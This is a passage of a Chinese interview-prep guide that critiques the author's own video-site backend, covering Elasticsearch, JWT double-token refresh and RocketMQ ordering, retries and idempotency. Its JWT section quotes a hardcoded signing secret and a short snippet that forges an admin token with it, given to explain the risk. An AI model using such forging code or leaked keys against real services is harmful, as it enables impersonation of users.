| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **无 IK 分词、无 mapping、dynamic 建索引** | 全模块 | 🔴 致命 | 自定义镜像装 IK + 显式 mapping |
| **`createIndex` 接口无鉴权可删索引** | `SearchServiceImpl:250-298` | 🔴 致命 | 加鉴权 / 只允许运维执行 |
| **深分页 + `track_total_hits` 缺失导致总页数错** | `SearchServiceImpl:96-99,141` | 🟠 高 | `search_after` + `trackTotalHits` |
| ES 超时 300s 过长 | `ElasticsearchClientConfig:54-56` | 🟠 高 | 1-3s connect / 10-30s socket |
| 无认证连接 ES | `ElasticsearchClientProperties` 未使用 | 🟠 高 | 开启 X-Pack Security |
| 启动 ping 阻塞 | `ElasticsearchClientConfig:60-73` | 🟠 高 | 异步探测 + HealthIndicator |
| 高亮未在 ES 实现，前端正则做（XSS 风险） | `SearchServiceImpl:32` import 未用 | 🟡 中 | `HighlightBuilder` + 转义 |
| 补全用历史词 multiMatch，非 completion | `SearchServiceImpl:204-216` | 🟡 中 | completion suggester / edge_ngram |
| 两个索引串行查询 | `totalKeywordSearch` | 🟡 中 | `MultiSearchRequest` |
| 依赖污染 data-es starter 3.1.2 | `java/pom.xml:36` | 🟡 中 | 删除未使用依赖 |

---

## 第 8 章 JWT —— token 的实现形式

### 8.1 在这个项目里它扮演什么角色

**一句话**：JWT 是这个项目的**无状态认证凭据**，采用「**长短双 Token**」设计：短 Token 放请求头用于业务鉴权，长 Token 放 HttpOnly Cookie 用于续期。

**配置与常量（`gateway/constant/Constant.java`）**

| 常量 | 值 | 含义 |
|---|---|---|
| `SHORT_TOKEN` | `"shortAuthorization"` | 短 Token 的请求头名 |
| `LONG_TOKEN` | `"longAuthorization"` | 长 Token 的 Cookie 名 |
| `SHORT_TOKEN_EXPIRATION` | `30 * 60 * 1000` | **30 分钟** |
| `LONG_TOKEN_EXPIRATION` | `7 * 24 * 60 * 60 * 1000` | **7 天** |
| `SECRET_KEY` | `"labilibili_key"` | **⚠️ 硬编码在源码里** |
| `TOKEN_SUBJECT` | `"labilibili"` | `sub` 声明 |
| `JWT_ROLE` / `JWT_ROLE_NAME` | `"role"` / `"user"` | 自定义权限声明 |

**签发内容（`JwtUtil.generateToken`）**

```java
Map<String, Object> claims = new HashMap<>(1);
claims.put(JWT_ROLE, "user");        // 自定义声明：角色
claims.put(USERIDENTITY, userId);    // 自定义声明：用户 id
return Jwts.builder()
        .setClaims(claims)
        .setSubject(TOKEN_SUBJECT)
        .setIssuedAt(new Date(System.currentTimeMillis()))
        .setExpiration(new Date(System.currentTimeMillis() + expirationTime))
        .signWith(SignatureAlgorithm.HS512, SECRET_KEY)   // HMAC-SHA512 对称签名
        .compact();
```

### 8.2 高频问答

**Q1 [必答] 为什么用 JWT？和 Session 有什么区别？**

- **答**（三段）：
  - **① 项目里解决什么**：我的架构是**前后端分离 + 微服务多实例**。如果用传统 Session：
    - 用户登录后 Session 存在**单个服务实例**的内存里，网关把请求负载均衡到另一台实例时**认不出用户**；
    - 要解决就得引入 **Spring Session + Redis** 做集中式 Session 存储，多一次 Redis 往返，而且服务横向扩容时还要维护 Session 共享；
    - 更麻烦的是**跨服务**：网关认证完了，user_center / video 服务怎么知道当前用户是谁？Session 方案要把 Session 数据再从 Redis 拉一遍。
    
    用 JWT 则是**自包含（self-contained）**的：用户信息（userId、role）**编码在 token 里**，每个服务只要拿到 token 各自验签就能解析出身份，**不需要查任何中心存储**。这正是「无状态认证」的价值——服务可以随意扩容，不依赖共享会话。
  - **② 两者的本质区别**（表格，最好背）：
    | 维度 | Session | JWT |
    |---|---|---|
    | 状态存储 | **服务端**（内存/Redis） | **客户端**（token 本身） |
    | 扩展性 | 需要共享存储才能横向扩容 | 天然无状态，扩容无成本 |
    | 服务端开销 | 每次请求查 Session | 只做验签（CPU 计算） |
    | **主动失效** | ✅ 简单（删 Session） | ❌ **难**（签发即有效，除非维护黑名单） |
    | 载荷大小 | 只传 sessionId（小） | 传全部 claim（大，且每次请求都带） |
    | 安全性 | 需防 CSRF（靠 Cookie） | 需防 XSS（靠 localStorage） |
    | 跨域 | Cookie 有跨域限制 | header 传递，跨域友好 |
  - **③ 代价**：JWT **不能主动失效**——用户登出、改密码、被封号之后，**已签发的 token 在过期前依然有效**。这是我这套实现最大的痛点，也是为什么实际工程里「纯 JWT」很少见，通常是「JWT + Redis 黑名单/白名单」的混合方案（见 Q5）。

**Q2 [必答] JWT 的结构是什么？**

- **答**：三段用 `.` 连接的 Base64Url 字符串：`Header.Payload.Signature`

  ```
  eyJhbGciOiJIUzUxMiJ9 . eyJyb2xlIjoidXNlciIsInVzZXJJZCI6MTIzLCJzdWIiOiJsYWJpbGliaWxpIn0 . xxxxxx
  ```
  | 段 | 内容 | 说明 |
  |---|---|---|
  | **Header** | `{"alg":"HS512"}` | 声明签名算法 |
  | **Payload** | 业务声明 + 标准声明 | 我放了 `role`、`userId`、`sub`、`iat`、`exp` |
  | **Signature** | `HMACSHA512(base64(header) + "." + base64(payload), SECRET_KEY)` | **防篡改** |

  - **最关键的一点（必须强调）**：**Payload 只是 Base64 编码，不是加密**！任何人把中间那段 Base64 解码就能看到 `userId` 和 `role`。
    - **验证方法**：`echo 'eyJyb2xlIjoidXNlciIsInVzZXJJZCI6MTIzfQ' | base64 -d` 就能看到明文。
    - **所以**：**绝对不要在 JWT 里放敏感信息**（密码、手机号、身份证）。我项目里只放了 `userId` 和 `role`，这一点是对的。
    - **Signature 的作用只是防篡改**，不是防偷看。想保密必须用 JWE（JSON Web Encryption）。

  - **标准声明（Registered Claims）**：
    | 字段 | 全称 | 含义 |
    |---|---|---|
    | `iss` | issuer | 签发者 |
    | `sub` | subject | 主题（我用来放 `labilibili`） |
    | `aud` | audience | 接收方 |
    | `exp` | expiration time | **过期时间（必须校验！）** |
    | `nbf` | not before | 生效时间 |
    | `iat` | issued at | 签发时间 |
    | `jti` | JWT ID | 唯一标识（**做黑名单要用它**） |

**Q3 [必答] 你的双 Token 机制是怎么设计的？**

- **答**（**讲设计意图，然后老实说实现是坏的**）：
  - **设计意图**：
    ```
    登录成功
      ├─ 短 Token（30 分钟）→ 返回给前端，放在 localStorage，每次请求放 shortAuthorization 头
      └─ 长 Token（7 天）  → 写进 HttpOnly + Secure Cookie，前端 JS 读不到（防 XSS）

    短 Token 过期（401）
      └─ 前端自动调 /login/refreshToken → 后端读 Cookie 里的长 Token → 签一个新的短 Token 返回
         （长 Token 也快过期时，一并刷新长 Token）

    长 Token 也过期 → 强制重新登录
    ```
  - **为什么这么设计**：**短 Token 降低泄露风险**（暴露在 localStorage 里的那个有效期只有 30 分钟），**长 Token 放在 HttpOnly Cookie 里 JS 偷不到**，用「短 Token 高频使用 + 长 Token 低频使用」的组合把「安全」和「体验」折中。这是标准的「refresh token」模式。
  - **⚠️ 但我要主动说明，实现是坏的**（**必须说，否则一问就穿**）：
    ```java
    // LoginController.java:97-109
    @PostMapping("/refreshToken")
    public ... refreshToken(ServerWebExchange exchange) {
        String longToken = exchange.getRequest().getCookies().getFirst(LONG_TOKEN).getValue();
        ResponseCookie cookie = ResponseCookie.from(LONG_TOKEN, JwtUtil.refreshToken(longToken, 1))
                .maxAge(LONG_TOKEN_EXPIRATION)     // ← 用长 token 换长 token
                .build();
        ...
    }
    ```
    问题有三个：
    1. **用长 Token 换的是长 Token**（`refreshToken(longToken, 1)` 里 `type=1` 走 `generateLongToken`），**短 Token 从来没被刷新过**。结果短 Token 一过期（30 分钟），用户就**拿不到新的短 Token**，业务接口全部 401——**「刷新」这个功能实际上是坏的**。
    2. **Cookie maxAge 单位不一致也是个坑**：`LoginController` 里登录时写 `.maxAge(60*30)`（**30 分钟**），而 `refreshToken` 里写 `.maxAge(LONG_TOKEN_EXPIRATION)` = `7*24*60*60*1000` = **604,800,000 秒 ≈ 19 年**。`ResponseCookie.maxAge` 的单位是**秒**，而 `LONG_TOKEN_EXPIRATION` 是**毫秒**。同一个 Cookie 两处 maxAge，一处 30 分钟一处 19 年。
    3. **`LoginController:39` 直接取 Cookie 可能 NPE**：`exchange.getRequest().getCookies().getFirst(SESSIONID).getValue()` 没判空，第一次访问（还没有 sessionId Cookie）会**抛 NPE**。
  - **正确实现**：
    ```java
    @PostMapping("/refreshToken")
    public Mono<Void> refreshToken(ServerWebExchange exchange) {
        String longToken = exchange.getRequest().getCookies().getFirst(LONG_TOKEN) == null
                ? null : exchange.getRequest().getCookies().getFirst(LONG_TOKEN).getValue();
        if (longToken == null || !JwtUtil.validateToken(longToken)) {
            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);
            return exchange.getResponse().setComplete();
        }
        Integer userId = JwtUtil.getClaimsFromToken(longToken).get(USERIDENTITY, Integer.class);
        String newShort = JwtUtil.generateShortToken(userId);          // ← 换短 token！ 
        exchange.getResponse().getHeaders().add("shortAuthorization", newShort);
        // 剩余有效期不足 1 天时，顺带续期长 token
        if (剩余时间 < 1天) { 写新 Cookie，maxAge 用秒 }
        return exchange.getResponse().setComplete();
    }
    ```

**Q4 [深挖] 你的 SECRET_KEY 是硬编码的，有什么风险？**

- **考点**：**安全红线题，必须主动认。**

- **答**：
  - **事实**：`Constant.SECRET_KEY = "labilibili_key"`，**明文写在源码里并提交进了 Git**。
  - **风险链**：
    1. 任何人拿到源码（或反编译 jar、或看到 GitHub 仓库）就知道签名密钥；
    2. 知道密钥就能**自己签发任意 token**——想当哪个用户就当哪个用户，想给谁 admin 权限就给谁：
       ```java
       // 攻击者本地执行
       Jwts.builder().claim("userId", 1).claim("role", "admin")
           .signWith(SignatureAlgorithm.HS512, "labilibili_key").compact();
       ```
    3. 而且我用的 `HS512` 是**对称算法**——验签和签名用**同一个密钥**，所以**密钥泄露 = 完全沦陷**，不像 RS256 那样可以把公钥广为分发、私钥只留在认证服务。
  - **正确做法**：
    | 措施 | 说明 |
    |---|---|
    | **密钥外置** | 放环境变量或 **Nacos 配置中心**（我项目已经引入了 nacos-config，正好用上），代码里只读 `${jwt.secret}` |
    | **密钥足够长** | HS512 要求密钥 **≥ 64 字节**（512 bit），`"labilibili_key"` 只有 13 字节，**严重不达标**，暴力破解空间极小 |
    | **改用非对称算法** | RS256/ES256：认证服务持私钥签发，各资源服务用**公钥验签**，公钥可以公开分发；即使某个服务被攻破，也拿不到签发能力（用 JWKS 端点分发公钥，方便轮换） |
    | **泄露后必须轮换** | 一旦密钥进过 git history，**删文件毫无意义**——历史提交、CI 缓存、克隆副本里都有。必须**生成新密钥并让所有旧 token 失效** |
    | **加密钥版本（kid）** | header 里带 `kid`，支持多密钥并行，实现平滑轮换 |
  - **同样的坑还有一处**：`chat/constant/Constant.java` 里星火的 `appId/apiKey/apiSecret` 是 `"xxx"` 占位符（作者脱敏过），**同理必须外置**。

**Q5 [进阶] JWT 怎么实现登出 / 主动失效？**

- **考点**：**这题是 JWT 面试的必考追问**，而且直击我项目的缺口。

- **答**：
  - **现状（诚实）**：**我的项目完全没有登出功能**。因为 JWT 无状态，服务端签发完就不管了，**「登出」在前端只是删掉 localStorage 里的 token**——但那个 token 在 30 分钟内**依然有效**，抓包拿到它照样能调接口。这是纯 JWT 方案的固有缺陷。
  - **而且我做不了「踢人下线」**：用户改密码、账号被盗、管理员封号，都没有任何机制能立刻让已签发的 token 失效。
  - **正确方案（按推荐度排序）**：
    1. **Redis 黑名单（推荐，成本最低）**：
       ```java
       // 登出时
       String jti = claims.getId();          // 需要签发时设 .setId(UUID)
       redis.setex("jwt:blacklist:" + jti, 剩余有效期秒数, "1");
       // 每次校验时
       if (redis.hasKey("jwt:blacklist:" + jti)) return 401;
       ```
       **关键设计**：黑名单的 TTL 只需要**剩余有效期**——token 自然过期后就自动从黑名单里清掉，**黑名单不会无限膨胀**。这是这个方案能用的核心原因。因为要存 `jti`，签发时必须 `.setId(UUID.randomUUID().toString())`（我代码里没设，要补）。
    2. **白名单 / 单点登录控制**：
       ```java
       // 登录时记录当前有效 token
       redis.set("jwt:valid:" + userId, jti, 7, DAYS);
       // 校验时比对，不一致说明已在他处登录 → 踢掉旧会话
       ```
       这个方案顺便实现了**「同一账号只能一处登录」**。代价是每个请求多一次 Redis 查询（**破坏了 JWT 无状态的核心优势**，所以只适合「需要强管控」的场景）。
    3. **短有效期 + 长 Token 管控**（我现在设计意图上走的路）：短 Token 只活 5-15 分钟，泄露窗口小；长 Token 存 Redis 可主动删。**这条路是对的，但我实现坏了**（见 Q3）。
    4. **改密码时全量失效**：在 user 表加 `pwd_version` 字段，签发时把它放进 claims，校验时比对 DB/Redis 里的当前值——版本不一致就拒绝。**这样不用维护黑名单，改密码即可踢掉所有旧 token。**
  - **加分句**：**「我理解 JWT 不是『不用存状态』，而是『把状态放在了 token 里』。一旦业务需要主动失效，这个状态就必须搬回服务端，JWT 就退化成了『带签名的 SessionId』。所以选型时要先问清楚：这个系统需不需要强制下线？需不需要即时封号？如果需要，纯 JWT 就是错的选择。」**

**Q6 [进阶] JWT 存在哪？localStorage 还是 Cookie？**

- **答**：
  - **两种方案的取舍**（必须能说清）：
    | 存储位置 | 风险 | 说明 |
    |---|---|---|
    | **localStorage / sessionStorage** | **XSS** | JS 能读到；一旦有 XSS 漏洞，token 直接被偷。但天然免疫 CSRF（不会自动携带） |
    | **HttpOnly Cookie** | **CSRF** | JS 读不到（防 XSS）；但浏览器自动携带，需要 `SameSite` / CSRF Token 防护 |
  - **我的设计**：**短 Token 放 header（前端存 localStorage）+ 长 Token 放 HttpOnly Cookie**。这是一个折中：高频使用、泄露影响小的那个放前端；低频使用、有效期长的那个用 HttpOnly 保护。
  - **但要补的三件事**：
    1. Cookie 要加 **`Secure`**（只在 HTTPS 传）、**`SameSite=Strict` 或 `Lax`**（防 CSRF）；我代码里 `ResponseCookie` 没设这两个属性。
    2. 短 Token 在 localStorage 里要配 **CSP（Content-Security-Policy）** 降低 XSS 面。
    3. 前端要在**短 Token 过期时自动刷新**（拦截器 + 401 重试），并用**单飞（single-flight）** 模式避免并发请求同时触发多次刷新。
  - **更好的方案**：**BFF 模式**——token 全部放 HttpOnly Cookie，由后端（或网关）在转发时注入 `Authorization` 头，前端完全接触不到 token。代价是需要 CSRF 防护 + 更复杂的部署。

**Q7 [深挖] 你项目里的 token 刷新还有什么问题？**

- **答**（接着 Q3 说完剩下的）：
  1. **`refreshToken` 没有校验长 Token 是否合法**：它直接 `JwtUtil.refreshToken(longToken, 1)`，而 `refreshToken` 内部确实调了 `validateToken`，所以这点侥幸没事；但**如果 Cookie 不存在会 NPE**（`getFirst(LONG_TOKEN).getValue()`）。
  2. **刷新出来的 token 没有检查「用户是否还存在/是否被封」**：如果用户在 7 天内被删除，长 Token 依然能刷出短 Token。
  3. **没有防重放**：同一个 refresh token 可以被无限次使用。更好的做法是**一次性 refresh token**（用过即换新的，旧的进黑名单）——这样如果 refresh token 被盗，攻击者用了之后**真正的用户下次刷新就会失败**，能提前发现泄露。
  4. **没有 `jti`**：所以既做不了黑名单，也做不了「token 复用检测」。
  5. **`id` 为 null 依然签发 token**：`phoneNumberLogin` / `mailLogin` 里如果用户不存在会新建用户，但如果走的是「用户已存在但验证码错误」的分支，`id` 保持 `null`，代码却仍然 `JwtUtil.generateShortToken(id)` —— **给一个 null userId 签了 token**。虽然后续 claim 里 `userId=null` 用处不大，但这属于**逻辑漏洞**（应该在这些分支显式返回失败）。

### 8.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **SECRET_KEY 硬编码且仅 13 字节** | `Constant.java:34` | 🔴 致命 | 外置到 Nacos/环境变量，≥64 字节 |
| **对称算法 HS512 + 密钥泄露 = 任意伪造** | `JwtUtil:36` | 🔴 致命 | 改 RS256 + JWKS 分发公钥 |
| **token 无法主动失效，无登出** | 全模块 | 🟠 高 | `jti` + Redis 黑名单（TTL=剩余有效期） |
| **刷新逻辑坏：长换长，短 token 从不刷新** | `LoginController:97-109` | 🟠 高 | 长换短 |
| Cookie maxAge 单位混乱（30 分钟 vs 19 年） | `LoginController:49,67,86,107` | 🟠 高 | 统一用秒 |
| Cookie 缺 `Secure` / `SameSite` | `LoginController` | 🟠 高 | 补上 |
| 取 Cookie 未判空会 NPE | `LoginController:39` | 🟡 中 | 判空后返回 401 |
| 无 `jti`，无法做黑名单/复用检测 | `JwtUtil:27-38` | 🟡 中 | `.setId(UUID)` |
| `id` 为 null 仍签发 token | `LoginServiceImpl:121,163` | 🟡 中 | 分支显式返回失败 |
| **白名单里没有 `/login/**`，登录能通全靠过滤器的橡皮图章** | `SecurityConfig:33-45` | 🟠 高 | 修好过滤器后必须补 `/login/**` 到 permitAll |

> **⚠️ 最后一条特别重要**：`SecurityConfig` 的 `permitAll()` 列表里**没有 `/login/**`**。也就是说：一旦你把 `JwtAuthorizationFilter` 改成「真正解析 JWT」，**登录接口本身也会被要求带 token** → 用户永远登不进来（先有鸡还是先有蛋）。**修鉴权时必须同步把 `/login/**`、`/register/**`、`/getCaptcha` 加进白名单**，否则会把整个系统锁死。这不是理论问题——这是改这块代码时最容易踩的坑。

---

## 第 9 章 RocketMQ —— 异步处理队列

### 9.1 在这个项目里它扮演什么角色

**一句话**：RocketMQ 是这个项目的**异步解耦主动脉**。5 个 topic 把「主流程」和「可延迟/可重试/耗时长」的工作彻底分开，让投稿、点赞、评论这些**用户操作能立刻返回**。

**Topic 全景表（必须背下来，面试官会问「你用了几个 topic 干什么」）**

| Topic | 生产者 | 消费者（consumerGroup） | 消费模式 | 职责 |
|---|---|---|---|---|
| **`video-encode`** | notice（`SendNoticeServiceImpl.sendUploadNotice`） | `VideoEncodeConsumer`（`video-encode-group`） | **ORDERLY** | 视频转码、截封面、读时长 |
| **`mysqlToEs`** | notice（`SendDBChangeServiceImpl`） | `MysqlToEsConsumer`（`mysql-es-group`） | **CONCURRENTLY** | 数据变更 → 写 Redis List → 待同步 ES |
| **`like`** | notice（`sendVideoLikeMessageWithCallback`） | `LikeConsumer`（`like-group`） | **ORDERLY** | 点赞/取消点赞通知落库 |
| **`comment`** | notice（`sendCommentMessageWithCallback`） | `CommentConsumer` | — | 评论/回复通知落库 |
| **`dynamic`** | notice（`sendVideoUpdateMessageWithCallback`） | `DynamicConsumer` | — | 关注 UP 的动态推送 |

**发送方式**：**全部用 `asyncSend` + `SendCallback`**（异步发送 + 回调）

```java
// SendNoticeServiceImpl:33-45
rocketMQTemplate.asyncSend("video-encode", jsonMessage, new SendCallback() {
    @Override public void onSuccess(SendResult sendResult) { log.info("Rocket发射成功"); }
    @Override public void onException(Throwable e)         { log.error("坠机: " + e.getMessage()); }
});
```

**配置**：`rocketmq.name-server: localhost:9876`，`producer.group: producer`（video）/ `test`（notice）。

### 9.2 高频问答

**Q1 [必答] 为什么用 RocketMQ？项目里哪些地方用了？**

- **答**（三段）：
  - **① 项目里解决什么**：三个典型的异步场景：
    - **视频转码**：投稿后要转码（CPU 密集、几十秒到几分钟）、截封面、读时长。如果同步做，用户点「投稿」要等 1 分钟，HTTP 早超时了。**用 MQ 削峰 + 异步化**：主流程只负责存文件和落库，立刻返回「投稿成功」，转码消息进队列由消费者慢慢做。
    - **通知消息**：点赞、评论、关注这些操作会产生通知，但**通知不是主流程的关键路径**——点赞失败了用户要重试，通知失败了用户根本不在意。用 MQ 解耦，**点赞接口的耗时从「写 2 张表 + 更新计数」降到「写 1 张表 + 发一条消息」**。
    - **数据同步到 ES**：MySQL 写完之后要同步给 ES，这属于「最终一致」而非「强一致」。走 MQ 让 ES 同步失败时能重试，不影响主流程。
  - **② 为什么是 RocketMQ 不是 RabbitMQ / Kafka**：
    | 维度 | RocketMQ | RabbitMQ | Kafka |
    |---|---|---|---|
    | 语言/生态 | Java，**和项目同栈** | Erlang（问题排查门槛高） | Scala |
    | 吞吐 | 十万级 | 万级 | **百万级** |
    | **事务消息** | ✅ **原生支持** | ❌ 需插件 | ❌ |
    | **延时消息** | ✅ **18 个等级开箱即用** | 需插件 | ❌ |
    | **消息回溯** | ✅ 按时间戳回放 | ❌ | ✅ 按 offset |
    | **顺序消息** | ✅ **支持分区顺序** | 不保证 | 分区内有序 |
    | 消息过滤 | Tag + SQL92 表达式（**服务端过滤**） | 路由键 | 无 |
    | 运维复杂度 | 中 | 低 | 高（依赖 ZK/KRaft） |
    
    **选它的实在理由**：① **顺序消息**是我硬需求（点赞/取消点赞必须按顺序消费，否则「取消」先于「点赞」到达会导致通知表里留下错误的记录）；② **延时消息**以后做「投稿审核超时提醒」很顺手；③ 阿里系组件，中文文档、控制台完善、面试官熟悉度高。
  - **③ 代价**：RocketMQ **不保证消息不丢**（除非用同步刷盘 + 同步复制 + 事务消息全套），而且**消费者要做幂等**——我在代码里**没做幂等**，这是缺陷（见 Q5）。

**Q2 [必答] RocketMQ 的消息模型和核心概念讲一下。**

- **答**：
  ```
  Producer ──发送──> Topic（逻辑概念）
                       │
                       ├─ Queue 0 ─┐
                       ├─ Queue 1 ─┼─> Broker（物理存储）──> ConsumerGroup 里的 Consumer
                       └─ Queue 2 ─┘
  ```
  | 概念 | 说明 |
  |---|---|
  | **NameServer** | 无状态的路由注册中心。Producer/Consumer 从它拿 Topic → Broker 的路由信息。**节点之间不通信**（对比 Kafka 的 ZK/KRaft） |
  | **Broker** | 消息存储与转发。**Master 负责读写，Slave 负责备份**（4.5+ 支持 DLedger 自动主从切换） |
  | **Topic** | 消息的逻辑分类。我项目里 5 个 topic |
  | **Queue（MessageQueue）** | Topic 的物理分片。**并行度的基本单位**：一个 Queue 同时只能被一个消费者消费 |
  | **Tag** | Topic 下的二级分类，**服务端过滤**（Broker 就过滤掉了，不浪费带宽）。**我项目里没用 Tag**（见 Q6） |
  | **Key** | 业务标识（如 videoId），用于**按业务链路查消息**。**我也没用** |
  | **ConsumerGroup** | 消费者组。**组内是竞争关系**（一条消息只被组内一个消费者消费），**组间是广播** |
  | **Offset** | 消费位点，存在 Broker 侧（`consumerOffset.json`），所以重启不丢进度 |
  | **CommitLog** | 所有消息顺序写同一个文件（**顺序写 = 高性能的核心**） |
  | **ConsumeQueue** | 索引文件，按 Queue 维度记录「消息在 CommitLog 的物理偏移」 |
  | **IndexFile** | 按 Key 或时间区间检索消息的索引 |

  - **为什么 RocketMQ 吞吐高**：**所有消息顺序写入单个 CommitLog**（顺序写比随机写快几个数量级），用 `mmap` 零拷贝读取；ConsumeQueue 是轻量索引，不做数据拷贝。

**Q3 [必答] 顺序消息是怎么实现的？你用了 `ORDERLY` 对不对？**

- **考点**：**这题是我项目里一个"看似对了实际错了"的经典案例，答好了极其加分。**

- **答**：
  - **RocketMQ 的顺序消息原理**：
    - **全局顺序**：整个 Topic 只有一个 Queue，所有消息串行 —— **性能极差，几乎不用**。
    - **分区顺序（我用的是这个）**：**生产端用 `MessageQueueSelector` 把同一业务 key 的消息发到同一个 Queue**；消费端用 `ConsumeMode.ORDERLY`，Broker 对每个 Queue **加分布式锁**，保证同一 Queue 同时只有一个消费者线程在处理。
    ```java
    // 生产端必须这样发，才能保证同一 videoId 进同一队列
    rocketMQTemplate.sendOneWayOrderly(topic, msg, 
        (mqs, msg1, arg) -> mqs.get(Math.abs(arg.hashCode()) % mqs.size()), videoId);
    ```
  - **⚠️ 我项目里的问题**（**主动暴露，这题很关键**）：
    ```java
    // 生产端（SendNoticeServiceImpl）
    String topic = "like";
    rocketMQTemplate.asyncSend(topic, jsonMessage, new SendCallback() {...});   // ← 普通发送！
    
    // 消费端（LikeConsumer）
    @RocketMQMessageListener(topic = "like", consumerGroup = "like-group",
                            consumeMode = ConsumeMode.ORDERLY)                  // ← 声明了顺序
    ```
    **消费端声明了 `ORDERLY`，但生产端用的是普通 `asyncSend`（没有 MessageQueueSelector）**——这意味着：
    1. 同一条视频的「点赞」和「取消点赞」消息**会被轮询发到不同的 Queue**；
    2. 不同 Queue 之间**没有任何顺序保证**，所以「取消」完全可能先于「点赞」到达；
    3. **`ORDERLY` 的声明是无效的**（它只保证「同一 Queue 内有序」，而跨 Queue 就无法保证了）。
  - **更糟的是 `ORDERLY` 带来了额外代价**：`ConsumeMode.ORDERLY` 会让 Broker 对该 Queue **加锁串行消费**，**并发度退化成「Queue 数量 = 并行度」**，而且顺序消费失败时会**阻塞整个队列**（一直重试直到成功）。也就是说：**我付出了顺序消费的性能代价，却没有拿到顺序性的收益**。
  - **正确做法**：生产端改用 `sendOneWayOrderly` / `syncSendOrderly` + `MessageQueueSelector`（按 `videoId` 或 `userId` 做 hash 选队列），**两端都对齐才有意义**。
  - **我的注释里其实写了自己的困惑**（`LikeConsumer.java:19`）：
    > 「按顺序消费避免出现取消点赞消息在点赞消息之前触发导致异常的情况，但设置为并发执行其实也可以，rocketmq 有重试机制，总会等到点赞消息生成的时刻」
    
    这句话说明我当时意识到顺序消费有代价，但**没有意识到「顺序性根本没生效」**——这是典型的「以为配了参数就有效果」。**面试时主动说出来，效果远好于被问出来。**
  - **另一个更严重的问题**：`LikeConsumer` 消费时如果「取消点赞」先到，会执行 `likeNoticeMapper.delete(wrapper)` **删掉一个不存在的记录**（无影响），但**之后到达的「点赞」消息会 `insert` 一条通知** —— 结果是**用户取消点赞了，通知却还在**。这就是顺序性缺失的实际业务后果。

**Q4 [进阶] RocketMQ 怎么保证消息不丢？**

- **答**（**三段式：生产端 / Broker 端 / 消费端**，这是标准答法）：
  - **① 生产端不丢**：
    - 用 `syncSend`（同步发送）并**检查 `SendResult.getSendStatus()`**，`SEND_OK` 才算成功，失败要重试。**我项目里用的是 `asyncSend`，且在 `onException` 里只打了日志（`SendNoticeServiceImpl:42` → `log.error("坠机: " + e.getMessage())`）——消息就这么丢了。** 应该：失败落**本地重试表**，由定时任务补偿。
    - 用**事务消息**（`sendMessageInTransaction`）保证「本地数据库操作」和「消息发送」的原子性。我项目里是「先落库再发消息」，**中间挂掉就会出现「数据写了但消息没发」** —— 这正是事务消息要解决的问题。
  - **② Broker 端不丢**：
    - **刷盘策略**：`flushDiskType=SYNC_FLUSH`（同步刷盘）→ 消息写进磁盘才返回 ACK，**宕机不丢**；`ASYNC_FLUSH` 性能高但断电可能丢几百毫秒的数据。
    - **复制策略**：`brokerRole=SYNC_MASTER`（同步双写）→ 主从都写成功才返回。**单机部署（我项目里就是单机）等于没有任何副本保护。**
    - 两者都开就是「**同步刷盘 + 同步复制**」，金融级可靠，但吞吐会明显下降。
  - **③ 消费端不丢**：
    - **正常消费成功才提交 offset**。RocketMQ 的 `RocketMQListener.onMessage` **抛异常就是消费失败 → 自动重试**。**我项目里的消费者把异常吞了**：
      ```java
      // VideoEncodeConsumer:159-161
      } catch (Exception e) {
          e.printStackTrace();      // ← 吞掉了，RocketMQ 以为是消费成功
      }
      ```
      **这是致命写法**：转码失败（文件损坏、jina 编码器报错）时**消息被标记为消费成功，永远不会重试**，用户投稿的视频永远是坏的。正确做法是**让异常抛出**，交给 RocketMQ 的重试机制（默认 16 次，每次间隔递增：10s、30s、1m、2m...2h）。
    - 重试耗尽后进 **死信队列（`%DLQ%{consumerGroup}`）**，需要**人工兜底 + 告警**。我项目**没有配死信队列监控**。

**Q5 [进阶] 消息重复消费怎么办？幂等怎么做？**

- **答**：
  - **为什么会有重复**：RocketMQ 保证 **at-least-once（至少一次）** 语义。重复来自：① 生产者重试（网络超时但消息实际投递成功）；② 消费者处理完但提交 offset 前宕机 → 重启后重新消费；③ `ORDERLY` 模式下失败阻塞队列重试。
  - **幂等的通用做法**：
    | 方案 | 说明 | 适用 |
    |---|---|---|
    | **唯一索引**（数据库兜底） | 给业务表加唯一键（如 `(user_id, video_id, comment_id)`），重复插入直接失败 | **最简单可靠，推荐** |
    | **Redis 去重** | `SETNX msg:{msgId} 1 EX 3600`，已存在则跳过 | 高频、无 DB 写 |
    | **状态机判断** | 更新前检查当前状态（`where status = 0`），受影响行数为 0 说明已处理 | 状态流转类业务 |
    | **业务唯一键** | 用 `videoId + operationType` 作为幂等键 | 同步类任务 |
  - **⚠️ 我项目里的问题**：**完全没有幂等设计**。而且我核对过 schema：`like_notice`、`comment_notice`、`dynamic`、`dynamic_to_user` **四张表只有主键，没有任何唯一索引**（`docker/mysql/init/01-schema.sql:147-173`）。所以重复消费会直接**插入重复的通知记录**，用户会看到两条一样的点赞通知。
  - **正确做法**：`ALTER TABLE like_notice ADD UNIQUE KEY uk_notice (sender_id, video_id, comment_id, status);` —— **让数据库来兜底幂等**，代码里重复插入捕获 `DuplicateKeyException` 后直接返回成功（不要抛异常，否则会无限重试）。
  - **加分句**：**「幂等的关键不是『防止重复消息』（做不到），而是『重复消息不产生重复副作用』。所以要在副作用落地点做约束——数据库唯一索引是最经济的选择，因为它不依赖任何中间件，也不会因为 Redis 故障而失效。」**

**Q6 [深挖] 你项目里的 MQ 使用还有哪些问题？**

- **答**（逐条，按严重度）：
  1. **🔴 消费者吞异常，失败不重试**：`VideoEncodeConsumer:159`、`MysqlToEsConsumer`、各 Consumer 都是 `catch(Exception e) { e.printStackTrace(); }`。**MQ 重试机制完全失效**。
  2. **🔴 生产端 `onException` 只打日志，消息静默丢失**：`SendNoticeServiceImpl:42`、`SendDBChangeServiceImpl:38`。应该落重试表 + 告警。
  3. **🟠 无 Tag / 无 Key**：无法按业务维度过滤，也无法在控制台按 `videoId` 查消息链路。加 Tag（如 `video-encode` 下用 tag 区分「新投稿」和「重新转码」）能省掉不必要的消费。
  4. **🟠 `ORDERLY` 声明与生产端不匹配**：见 Q3。
  5. **🟠 无死信队列处理**：重试耗尽后消息进 DLQ 没人管，没有任何告警。
  6. **🟠 无消息堆积监控**：MQ 堆积是「消费者挂了」的最早信号，应该对 `consumerLag` 做告警（RocketMQ Dashboard 有，但项目里没接）。
